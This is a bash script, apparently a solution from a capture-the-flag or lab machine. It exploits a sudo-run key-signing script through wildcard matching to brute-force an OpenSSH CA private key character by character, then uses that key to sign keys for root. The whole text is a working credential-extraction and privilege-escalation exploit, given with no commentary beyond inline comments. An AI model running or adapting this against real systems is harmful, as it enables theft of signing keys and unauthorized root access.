#! /usr/bin/env bash

export starting_line='-----BEGIN OPENSSH PRIVATE KEY-----'
export ending_line='-----END OPENSSH PRIVATE KEY-----'
export base64_characters=$(echo {A..Z} {a..z} {0..9} + / =)
export ca_file='/tmp/test_ca'
export ca_file_workspace='/tmp/workspace_ca'
export public_key_file='/home/zzinter/test.pub'
export last_test_char=$(echo $base64_characters | tr ' ', '\n' | tail -n 1)

echo -e "${starting_line}" > "$ca_file"
cp "$ca_file" "$ca_file_workspace"

while ! tail -n 1 "$ca_file" | grep -- "$ending_line" > /dev/null ; do

        for char in $base64_characters ; do
                export match_found="False"
                export test_char=$char
                if cat "$ca_file" | tail -n 1 | tr -d '\n' | wc -m | grep 70 > /dev/null
                then
                        # Last line in the file has reached 70 characters
                        # Add the current test character on a new line
                        (cat "$ca_file" ; printf "\n${test_char}*")  > "$ca_file_workspace"
                else
                        # Add the test character on the same line
                        (cat "$ca_file" ; printf "${test_char}*")  > "$ca_file_workspace"
                fi

                if sudo /opt/sign_key.sh "$ca_file_workspace" "$public_key_file" root root_user 1 2>/dev/null | grep 'Use API' > /dev/null
                then
                        export match_found="True"
                        # Take the current state of the CA workspace and remove the * pattern
                        # Output the contents to the actual CA file
                        cat "$ca_file_workspace" | tr -d '\*' > "$ca_file"
                        echo "[+] matching character found: ${test_char}"
                        break
                else
                        if [ "$match_found" == "False" ] && [ "$test_char" == "$last_test_char" ]
                        then
                                echo "[-] no matching character found and all characters exhausted"
                                echo -e "\n${ending_line}" >> "$ca_file"
                        else
                                continue
                        fi
                fi
        done

done
